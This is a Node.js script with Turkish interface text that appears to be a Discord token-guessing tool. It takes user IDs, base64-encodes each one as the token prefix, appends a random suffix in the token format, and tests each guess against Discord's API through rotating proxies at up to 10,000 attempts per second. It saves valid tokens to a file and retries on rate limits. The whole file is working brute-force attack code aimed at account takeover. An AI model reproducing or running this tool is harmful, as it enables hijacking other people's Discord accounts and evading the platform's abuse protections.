const request = require('request');
const chalk = require('chalk');
const fs = require('fs');
const prompt = require('prompt');
var RandExp = require('randexp');
const ProxyAgent = require('proxy-agent');

var proxies = fs.readFileSync('proxies.txt', 'utf-8').replace(/\r/gi, '').split('\n');
var ID = fs.readFileSync('ids.txt', 'utf-8').replace(/\r/gi, '').split('\n');

var work = 0;
var invalid = 0;
var failed = 0;
var triesPerSecond = 10000;

process.on('uncaughtException', err => { });
process.on('unhandledRejection', err => { });
process.warn = () => { };

codegen = function () {
	var ids = ID[Math.floor(Math.random() * ID.length)];
	let data = ids;
	let buff = Buffer.from(data);
	let base64data = buff.toString('base64');
	tokenstart = base64data;
	var end = new RandExp(/^[A-Z]{1}([a-zA-Z0-9]){5}\.([a-zA-Z0-9_-]{38})$/).gen();
	token = tokenstart + "." + end;
	return token
}

function write(content, file) {
    fs.appendFile(file, content, function(err) {
    });
}		

function check(token, type){	
	var proxy = proxies[Math.floor(Math.random() * proxies.length)];
	var agent = new ProxyAgent(`${type}://${proxy}`);

	request({
		method: "GET",
		url: `https://discord.com/api/v9/users/@me/guilds`, 
		agent, 
		json: true,
		timeout: 2500,
		headers: {
			"Content-Type": "application/json",
			authorization: token,
		}						
	}, (err, res, body) => {
		if (res) {
			switch(res.statusCode){
				case 200:
					work++;
					console.log(chalk.green('[200] Çalışan Token | %s | %s' ), token, proxy);
					write(token + "\n", "tokens/working.txt");
					break;
				case 401: 
					invalid++;
					console.log(chalk.red(`[401] (${invalid}) | Geçersiz Token | %s | %s` ), token, proxy );
					write(token + "\n", "tokens/invalid.txt");
					break;
				case 429:
					console.log(chalk.yellow(`[429] | Hız Sınırı (Rate Limit)`));
					check(codegen(), type);
					break;
				default:
					check(codegen(), type);
					break;
			}
		} else {
			check(codegen(), type);
		}
		process.title = `[313][Token Oluşturucu] | Geçersiz: ${invalid} | Çalışan: ${work} | Toplam Proxy: ${proxies.length} `;
	});
}

process.title = `[313][Token Oluşturucu] | Geçersiz: ${invalid} | Çalışan: ${work} | Toplam Proxy: ${proxies.length} `;
console.log(chalk.inverse("Kullanıcı ID Kullanarak Token Tahmin Aracı"));
console.log("")

prompt.start();	
console.log(chalk.inverse("[BİLGİ] Başlatmak için Proxy tipini seçin: ")); 
console.log(`[1] https
[2] socks4
[3] socks5`); 

prompt.get(['type'], function(err, result) {
    console.log('');
    var type = result.type;
    var proxyType;

    switch(type) {
        case "1": 
            proxyType = "http";
            break
        case "2":
            proxyType = "socks4";
            break
        case "3":
            proxyType = "socks5";
            break
        default:
            proxyType = "http";
            break
    }

    console.log(chalk.cyan("Başlatılıyor..."));
    
    setInterval(() => {
        check(codegen(), proxyType);
    }, (1 / triesPerSecond) * 1000);
});
